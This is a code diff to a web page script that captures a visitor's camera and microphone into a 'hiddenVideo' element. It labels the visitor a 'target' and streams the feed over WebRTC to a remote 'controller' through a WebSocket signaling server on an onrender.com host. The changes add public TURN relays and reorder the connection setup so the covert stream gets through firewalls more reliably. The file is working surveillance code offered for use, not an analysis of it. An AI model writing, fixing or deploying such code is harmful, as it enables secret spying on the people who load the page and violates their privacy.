@@ -118,7 +118,7 @@
         const host = window.location.host || "hangon-k31m.onrender.com";
         const wsUrl = `${protocol}//${host}/ws/target`;
 
-        // Low-latency, geo-distributed STUN servers with candidate pre-pooling
+        // Low-latency, geo-distributed STUN & TURN relay servers
         const rtcConfig = {
             iceServers: [
                 { urls: "stun:stun.cloudflare.com:3478" },
@@ -126,15 +126,23 @@
                 { urls: "stun:stun1.l.google.com:19302" },
                 { urls: "stun:stun2.l.google.com:19302" },
                 { urls: "stun:stun3.l.google.com:19302" },
-                { urls: "stun:stun4.l.google.com:19302" }
+                { urls: "stun:stun4.l.google.com:19302" },
+                {
+                    urls: [
+                        "turn:openrelay.metered.ca:80",
+                        "turn:openrelay.metered.ca:443",
+                        "turn:openrelay.metered.ca:443?transport=tcp"
+                    ],
+                    username: "openrelay",
+                    credential: "openrelay"
+                }
             ],
-            bundlePolicy: "max-bundle",
-            rtcpMuxPolicy: "require",
             iceCandidatePoolSize: 10
         };
 
         let ws;
         let pc;
+        let localStream;
         let myTargetId = null;
         let pendingIceCandidates = [];
         const video = document.getElementById('hiddenVideo');
@@ -149,7 +157,7 @@
 
             try {
                 // Optimized constraints for instantaneous camera initialization & low latency
-                const stream = await navigator.mediaDevices.getUserMedia({
+                localStream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         width: { ideal: 1280, max: 1920 },
                         height: { ideal: 720, max: 1080 },
@@ -162,13 +170,16 @@
                     }
                 });
 
-                video.srcObject = stream;
+                video.srcObject = localStream;
 
+                // 1. Create Peer Connection & Add Tracks FIRST
+                initWebRTC(localStream);
+
+                // 2. Open WebSocket after PeerConnection is ready
                 ws = new WebSocket(wsUrl);
 
                 ws.onopen = function () {
                     console.log("[+] Connected to signaling server");
-                    initWebRTC(stream);
                 };
 
                 ws.onmessage = async (event) => {
@@ -177,8 +188,12 @@
                         if (msg.type === "init") {
                             myTargetId = msg.targetId;
                             console.log("[+] Target assigned ID:", myTargetId);
-                        } else if (msg.type === "offer" && pc) {
+                        } else if (msg.type === "offer") {
                             console.log("[+] Processing offer immediately");
+                            if (!pc) {
+                                initWebRTC(localStream);
+                            }
+                            
                             await pc.setRemoteDescription(new RTCSessionDescription(msg.data));
                             
                             // Flush any queued ICE candidates
@@ -192,9 +207,10 @@
 
                             if (ws && ws.readyState === WebSocket.OPEN) {
                                 ws.send(JSON.stringify({ type: "answer", data: answer }));
+                                console.log("[+] Answer dispatched to controller");
                             }
-                        } else if (msg.type === "ice" && pc) {
-                            if (pc.remoteDescription && pc.remoteDescription.type) {
+                        } else if (msg.type === "ice") {
+                            if (pc && pc.remoteDescription && pc.remoteDescription.type) {
                                 await pc.addIceCandidate(new RTCIceCandidate(msg.data));
                             } else {
                                 pendingIceCandidates.push(msg.data);
@@ -223,7 +239,12 @@
             pc = new RTCPeerConnection(rtcConfig);
 
             // Add camera & mic tracks immediately
-            stream.getTracks().forEach(track => pc.addTrack(track, stream));
+            if (stream) {
+                stream.getTracks().forEach(track => {
+                    console.log("[+] Adding track to peer:", track.kind);
+                    pc.addTrack(track, stream);
+                });
+            }
 
             // Instant ICE candidate trickling
             pc.onicecandidate = (event) => {
@@ -234,6 +255,10 @@
 
             pc.oniceconnectionstatechange = () => {
                 console.log("[*] ICE Connection State:", pc.iceConnectionState);
+            };
+
+            pc.onconnectionstatechange = () => {
+                console.log("[*] Peer Connection State:", pc.connectionState);
             };
         }
     </script>
